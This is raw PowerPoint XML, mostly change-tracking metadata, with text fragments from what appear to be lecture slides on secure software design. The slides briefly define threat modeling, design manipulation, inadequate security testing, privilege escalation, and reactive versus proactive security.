        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:40:41.393" v="2119"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3194961477" sldId="415"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:13:34.411" v="2007" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="958426234" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:10:52.451" v="2002" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1653228231" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-11T07:08:20.292" v="1965" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="574555631" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-11T07:07:49.537" v="1961" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1293863796" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-11T07:10:36.762" v="1988" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1118759039" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:19:21.501" v="2037" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2909304318" sldId="421"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:20:16.279" v="2043" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3065586434" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:21:36.885" v="2052" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1463157231" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:25:42.681" v="2065"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2568305707" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:27:35.610" v="2080" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3747966714" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:29:14.093" v="2085"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3966948570" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:30:58.753" v="2090"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3392931056" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:33:20.912" v="2097" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="70765890" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:16.690" v="2104" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1988594508" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:40:15.752" v="2117" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1305988210" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3026945778" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-25T12:20:06.150" v="2206" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2158398531" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2332699287" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="236900897" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-25T12:20:54.514" v="2209"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2733904292" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2421585517" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-25T12:22:51.152" v="2215" actId="404"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2494709287" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-25T12:23:45.822" v="2243" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1112806581" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1896859134" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-17T01:36:25.483" v="2105" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1955005863" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-25T12:26:19.021" v="2256" actId="108"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2994432945" sldId="435"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:21:53.004" v="2275" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="687874099" sldId="436"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:22:43.424" v="2283" actId="404"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1424753074" sldId="437"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:23:39.377" v="2291" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1715348504" sldId="438"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:25:51.920" v="2301" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1446343864" sldId="439"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:26:28.744" v="2307" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2713408755" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:27:19.500" v="2311" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2494932483" sldId="441"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:28:15.417" v="2325" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3523717158" sldId="442"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldMasterChg chg="delSldLayout modSldLayout">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-12T12:01:50.918" v="748" actId="5793"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="0" sldId="2147483672"/>
        </pc:sldMasterMkLst>
        <pc:sldLayoutChg chg="addSp delSp modSp mod">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:20:22.008" v="94" actId="167"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483648"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483649"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="addSp delSp modSp mod">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-12T12:01:50.918" v="748" actId="5793"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483650"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483651"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483652"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483653"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483655"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483659"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483660"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483661"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483662"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483663"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483664"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483665"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483666"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483672"/>
            <pc:sldLayoutMk cId="0" sldId="2147483667"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
      </pc:sldMasterChg>
      <pc:sldMasterChg chg="del delSldLayout">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMasterMkLst>
          <pc:docMk/>
          <pc:sldMasterMk cId="0" sldId="2147483673"/>
        </pc:sldMasterMkLst>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483673"/>
            <pc:sldLayoutMk cId="0" sldId="2147483670"/>
          </pc:sldLayoutMkLst>
        </pc:sldLayoutChg>
        <pc:sldLayoutChg chg="del">
          <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="0" sldId="2147483673"/>
            <pc:sldLayoutMk cId="0" sldId="214748367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75221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Functional Requirements: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>These are the requirements that the end user specifically demands as basic facilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Non-Functional Requirements: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Portability, Security, Maintainability, Reliability, Scalability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Threat modeling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is a structured approach to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>identifying</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>evaluating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>addressing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> potential security threats and vulnerabilities in a system — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>before</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> they can be exploited.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25382347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1E996-2C87-38AA-B69A-67B02C9DD4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A11773-A29C-E99E-FBE0-CA7A548A0E6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5137950-DFC3-DCC8-EE4E-A7910CB6E928}"/>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4287960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Design Manipulation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is the intentional alteration of a system's architecture or design to introduce weaknesses, backdoors, or security flaws – admin login based on client side selection as admin, no verification at server side.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Secure design principles such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Least Privilege, Input Validation</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1307078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Inadequate security or penetration testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>- testing login page for input data format but not for SQL injection or XSS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b="1" dirty="0"/>
              <a:t>Neglecting negative or boundary testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> means not testing with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>invalid, unexpected, or extreme input values</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN"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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31586179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Privilege Escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is when an attacker gains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>higher access rights or permissions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> than they are supposed to have — often by exploiting a vulnerability, misconfiguration, or weak access control.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Vertical Privilege Escalation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Low-level user gains admin or root access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Horizontal Privilege Escalation:     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User gains access to other users' data or functionality at the same level.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39899149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0872003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606996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Reactive security involves </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>responding to threats, incidents, or vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>after</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> they have occurred.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Proactive security means </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>anticipating and preventing threats</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> before they occur by building security into </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26843839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sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20223212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sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
